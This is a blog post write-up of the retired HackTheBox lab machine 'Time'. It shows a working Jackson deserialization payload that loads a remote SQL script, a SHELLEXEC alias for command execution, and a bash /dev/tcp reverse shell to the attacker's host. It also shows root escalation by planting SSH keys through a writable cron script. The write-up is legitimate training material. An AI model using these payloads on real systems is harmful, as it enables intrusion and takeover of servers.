
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="robots" content="" />

  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">

    <link rel="stylesheet" type="text/css" href="../../theme/stylesheet/style.min.css">

    <link id="dark-theme-style" rel="stylesheet" type="text/css"
          media="(prefers-color-scheme: dark)"
    href="../../theme/stylesheet/dark-theme.min.css">

    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: dark)"
          href="../../theme/pygments/monokai.min.css">
    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)"
          href="../../theme/pygments/sas.min.css">


  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/fontawesome.css">
  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/brands.css">
  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/solid.css">


    <link href="https://maggick.fr/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="maggick's logs Atom">



  


 

<meta name="author" content="maggick" />
<meta name="description" content="This is a writeup about a retired HacktheBox machine: Time publish on October 24, 2020 by egotisticalSW and felamos . This box is rated as a medium box. It implies a hard foothold using Jackson and some Google fu. The root part is quit fast as there is a writable bash script running regularly as root." />
<meta name="keywords" content="security, boot2root, HTB, linux, jackson, deserialization">


  <meta property="og:site_name" content="maggick's logs"/>
  <meta property="og:title" content="HTB: Time"/>
  <meta property="og:description" content="This is a writeup about a retired HacktheBox machine: Time publish on October 24, 2020 by egotisticalSW and felamos . This box is rated as a medium box. It implies a hard foothold using Jackson and some Google fu. The root part is quit fast as there is a writable bash script running regularly as root."/>
  <meta property="og:locale" content="en_US"/>
  <meta property="og:url" content="../../2021/04/htb-time.html"/>
  <meta property="og:type" content="article"/>
  <meta property="article:published_time" content="2021-04-07 19:20:00+02:00"/>
  <meta property="article:modified_time" content=""/>
  <meta property="article:author" content="../../author/maggick.html">
  <meta property="article:section" content="security"/>
  <meta property="article:tag" content="security"/>
  <meta property="article:tag" content="boot2root"/>
  <meta property="article:tag" content="HTB"/>
  <meta property="article:tag" content="linux"/>
  <meta property="article:tag" content="jackson"/>
  <meta property="article:tag" content="deserialization"/>
  <meta property="og:image" content="https://maggick.fr/media/image.png">

  <title>maggick's logs &ndash; HTB: Time</title>

</head>
<body >
  <aside>
    <div>
      <a href="../../">
        <img src="https://maggick.fr/media/image.png" alt="" title="">
      </a>

      <h1>
        <a href="../../"></a>
      </h1>



      <nav>
        <ul class="list">


              <li>
                <a target="_self"
                   href="../../pages/about.html">
                  About
                </a>
              </li>
              <li>
                <a target="_self"
                   href="../../pages/notes.html">
                  Notes
                </a>
              </li>
              <li>
                <a target="_self"
                   href="../../pages/tools.html">
                  Tools
                </a>
              </li>

        </ul>
      </nav>

      <ul class="social">
          <li>
            <a  class="sc-github" href="https://github.com/maggick" target="_blank">
              <i class="fab fa-github"></i>
            </a>
          </li>
          <li>
            <a  class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
              <i class="fab fa-twitter"></i>
            </a>
          </li>
          <li>
            <a  class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
              <i class="fab fa-stack-overflow"></i>
            </a>
          </li>
          <li>
            <a  class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
              <i class="fas fa-rss"></i>
            </a>
          </li>
      </ul>
    </div>

  </aside>
  <main>

    <nav>
      <a href="../../">Home</a>

      <a href="/archives.html">Archives</a>
      <a href="/categories.html">Categories</a>
      <a href="/tags.html">Tags</a>

      <a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>

    </nav>

<article class="single">
  <header>
      
    <h1 id="htb-time">HTB: Time</h1>
    <p>
      Posted on 07 Apr 2021 in <a href="../../category/security.html">security</a>

        &#8226; 3 min read
    </p>
  </header>


  <div>
    <p><img class="align-left" src="/media/2021.04/time_card.png" alt="Time Card" width="262"></p>
<p>This is a writeup about a retired HacktheBox machine:
<a href="https://www.hackthebox.com/home/machines/profile/286">Time</a> publish on
October 24, 2020 by
<a href="https://www.hackthebox.com/home/users/profile/94858">egotisticalSW</a> and
<a href="https://www.hackthebox.com/home/users/profile/27390">felamos </a>.
This box is rated as a medium box. It implies a hard foothold using Jackson and
some Google fu. The root part is quit fast as there is a writable bash script
running regularly as root.</p>


<h1>Foothold</h1>
<h2>Recon</h2>
<p>Let us start as always by a <code>nmap</code> scan. Only port 80 (HTTP) and 22 (SSH) are
open.</p>
<div class="highlight"><pre><span></span><code># Nmap 7.91 scan initiated Wed Nov  11 12:02:12 2020 as: nmap -sS -p- -oN nmap 10.129.29.179
Nmap scan report for 10.129.29.179
Host is up (0.012s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

# Nmap done at Wed Nov  11 12:02:28 2020 -- 1 IP address (1 host up) scanned in 15.91 seconds
</code></pre></div>

<h2>Web</h2>
<p>The website is an online tool to beautify and validate json data.</p>
<p>![/media/2020.xx/time_01.png]</p>
<p>When we try to validate "garbage" input. We got an error message "Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unrecognized token 'qe': was expecting ('true', 'false' or 'null')"</p>
<p>We see that the website is using the Jackson library.</p>
<p>As we want a RCE we start a few Google search with "jackson fasterxml rce".
The results are from 2017:</p>
<ul>
<li>https://medium.com/@swapneildash/understanding-insecure-implementation-of-jackson-deserialization-7b3d409d2038</li>
<li>https://adamcaudill.com/2017/10/04/exploiting-jackson-rce-cve-2017-7525/</li>
<li>https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062</li>
</ul>
<p>We continue our searches and finally get to "jackson gadget". Which lead us to a
more recent <a href="https://blog.doyensec.com/2019/07/22/jackson-gadgets.html">article about Jackson gadgets</a>.</p>
<p>We send the following request (we just URL encoded the data parameter)</p>
<div class="highlight"><pre><span></span><code>POST / HTTP/1.1
Host: 10.129.29.179
User-Agent: Mozilla/4.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 174
Origin: http://10.129.29.179
Connection: close
Referer: http://10.129.29.179/
Upgrade-Insecure-Requests: 1

mode=2&amp;data=[&quot;ch.qos.logback.core.db.DriverManagerConnectionSource&quot;,+{&quot;url&quot;:&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT+FROM+&#39;http://10.10.14.25:8000/inject.sql&#39;&quot;}]

Our inject.sql file looks like the following:

:::text
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
        String[] command = {&quot;bash&quot;, &quot;-c&quot;, cmd};
        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter(&quot;\\A&quot;);
        return s.hasNext() ? s.next() : &quot;&quot;;  }
$$;
CALL SHELLEXEC(&#39;&lt;payload&gt;&#39;)
</code></pre></div>

<p>We start with a first simple payload <code>wget http://10.10.14.25:8000/rce</code>
as we see the query in our python server log we know that we have RCE</p>
<p>We change the payload to get a <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">reverse shell</a>
<code>bash -i &gt;&amp; /dev/tcp/10.10.14.25/4242 0&gt;&amp;1</code></p>
<p>This allows us to get a shell and grab the user flag.</p>
<div class="highlight"><pre><span></span><code>kali@kali:/tmp$ nc -l -p4242
bash: cannot set terminal process group (958): Inappropriate ioctl for device
bash: no job control in this shell
pericles@time:/var/www/html$ cat /home/pericles/user.txt
cat /home/pericles/user.txt
74555f76d2e8013945afd9233ca2f219
</code></pre></div>

<h1>Root</h1>
<p>We start by checking our privileges. We are not part of any specific group. As we don't know our password we cannot use sudo.</p>
<div class="highlight"><pre><span></span><code>pericles@time:/var/www/html$ id
id
uid=1000(pericles) gid=1000(pericles) groups=1000(pericles)
</code></pre></div>

<p>As we want to transfer file and have a better shell, we "upload" our SSH key:</p>
<div class="highlight"><pre><span></span><code>mkdir /home/pericles/.ssh
echo &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/ElCFvS&lt;SNIP&gt;&#39; &gt; /home/pericles/.ssh/authorized_keys
</code></pre></div>

<p>We upload <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">linpeas</a> using scp and run it.
We discover that we have access to the /usr/bin/timer_backup.sh file (read and write)</p>
<div class="highlight"><pre><span></span><code>[+] .sh files in path
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path
/usr/bin/gettext.sh
You own the script: /usr/bin/timer_backup.sh
/usr/bin/rescan-scsi-bus.sh
</code></pre></div>

<p>We take a look at the file. It seems that root is regulary making a backup of the website.</p>
<div class="highlight"><pre><span></span><code>pericles@time:~$ cat /usr/bin/timer_backup.sh
#!/bin/bash
zip -r website.bak.zip /var/www/html &amp;&amp; mv website.bak.zip /root/backup.zip
</code></pre></div>

<p>We modify the file using Vim and add the following lines</p>
<div class="highlight"><pre><span></span><code>mkdir /root/.ssh
echo &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/ElCFv&lt;SNIP&gt;&#39; &gt; /root/.ssh/authorized_keys
</code></pre></div>

<p>Waiting a few seconds and connecting back to the box with the root user allow us to get a shell and grab the flag.</p>
<div class="highlight"><pre><span></span><code>kali@kali:~$ ssh root@10.129.29.179
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-52-generic x86_64)

&lt;SNIP&gt;

Last login: Fri Oct 23 10:05:26 2020
root@time:~# cat root.txt
50fb5aa6e01ec64a77c48d42cf533088
</code></pre></div>

<h1>Wrapping up</h1>
<p>The root part was easy, the jackson exploitation was harder and mostly some Google fu.
Nonetheless an interesting box to play with Java Deserialization vulnerabilities.</p>
  </div>
  <div class="tag-cloud">
    <p>
      <a href="../../tag/security.html">security</a>
      <a href="../../tag/boot2root.html">boot2root</a>
      <a href="../../tag/htb.html">HTB</a>
      <a href="../../tag/linux.html">linux</a>
      <a href="../../tag/jackson.html">jackson</a>
      <a href="../../tag/deserialization.html">deserialization</a>
    </p>
  </div>


  <div class="neighbors">
    <a class="btn float-left" href="../../2021/03/htb-passage.html" title="HTB: Passage">
      <i class="fa fa-angle-left"></i> Previous Post
    </a>
    <a class="btn float-right" href="../../2021/05/htb-ready.html" title="HTB: Ready">
      Next Post <i class="fa fa-angle-right"></i>
    </a>
  </div>



</article>

    <footer>
<p>
  &copy; 2022  - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/deed.en_US" target="_blank">Creative Commons Attribution</a>
</p>
<p>
Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
  <span class="footer-separator">|</span>
  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
  <script id="dark-theme-script"
          src="../../theme/dark-theme/dark-theme.min.js"
          data-enable-auto-detect-theme="True"
          data-default-theme="light"
          type="text/javascript">
  </script>
</p><p>
  <a rel="license"
     href="http://creativecommons.org/licenses/by/4.0/"
     target="_blank">
    <img alt="Creative Commons License"
         title="Creative Commons License"
         style="border-width:0"
           src="https://i.creativecommons.org/l/by/4.0/80x15.png"
         width="80"
         height="15"/>
  </a>
</p>    </footer>
  </main>




<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " maggick's logs ",
  "url" : "../..",
  "image": "https://maggick.fr/media/image.png",
  "description": ""
}
</script>

</body>
</html>